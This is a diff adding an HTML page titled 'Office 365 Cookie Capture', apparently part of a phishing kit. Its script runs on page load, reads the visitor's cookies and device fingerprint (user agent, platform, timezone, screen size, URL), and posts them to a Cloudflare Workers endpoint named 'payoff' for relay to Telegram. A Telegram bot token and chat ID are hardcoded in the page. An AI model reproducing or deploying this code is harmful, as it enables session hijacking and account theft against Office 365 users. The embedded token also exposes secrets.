@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Cookies</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            background: #f0f0f0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            max-width: 500px;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        .status {
+            background: #e3f2fd;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            text-align: center;
+            color: #1976d2;
+        }
+        .success {
+            background: #c8e6c9;
+            color: #2e7d32;
+        }
+        .error {
+            background: #ffcdd2;
+            color: #c62828;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1976d2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background: #1565c0;
+        }
+        pre {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-size: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🍪 Office 365 Cookie Capture</h1>
+        
+        <div class="status" id="status">
+            Analyzing cookies...
+        </div>
+        
+        <h3>Captured Data:</h3>
+        <pre id="cookieData">Loading...</pre>
+        
+        <button onclick="captureCookies()">Refresh Capture</button>
+        <button onclick="sendToServer()">Send to Telegram</button>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7716591635:AAG_u5Dkit5Nfw3qXpg-mCl0IMc9nqCxyDY";
+        const TELEGRAM_CHAT_ID = "5045363500";
+        const WORKER_URL = "https://payoff.56575657zz-ba0.workers.dev/api/receive-token";
+
+        function captureCookies() {
+            const status = document.getElementById('status');
+            const output = document.getElementById('cookieData');
+            
+            try {
+                // Capture all accessible cookies
+                const cookies = document.cookie;
+                
+                // Capture browser/device info
+                const deviceInfo = {
+                    cookies: cookies || "(No accessible cookies - Office 365 uses HttpOnly)",
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    timestamp: new Date().toISOString(),
+                    hostname: window.location.hostname,
+                    url: window.location.href
+                };
+                
+                output.textContent = JSON.stringify(deviceInfo, null, 2);
+                
+                if (!cookies) {
+                    status.textContent = "⚠️ No accessible cookies found (expected for Office 365 - uses HttpOnly cookies)";
+                    status.className = "status";
+                } else {
+                    status.textContent = "✅ Cookies captured successfully";
+                    status.className = "status success";
+                }
+                
+            } catch (error) {
+                status.textContent = `❌ Error: ${error.message}`;
+                status.className = "status error";
+                output.textContent = error.stack;
+            }
+        }
+
+        async function sendToServer() {
+            try {
+                const deviceInfo = {
+                    cookies: document.cookie || "(HttpOnly - not accessible)",
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href
+                };
+
+                const response = await fetch(WORKER_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        token: "Office365_Cookie_Capture",
+                        deviceInfo: deviceInfo,
+                        cookieData: deviceInfo
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    const status = document.getElementById('status');
+                    status.textContent = "✅ Data sent to Telegram successfully";
+                    status.className = "status success";
+                }
+            } catch (error) {
+                console.error("Error:", error);
+                const status = document.getElementById('status');
+                status.textContent = `❌ Failed to send: ${error.message}`;
+                status.className = "status error";
+            }
+        }
+
+        // Auto-capture on load
+        window.onload = captureCookies;
+    </script>
+</body>
+</html>
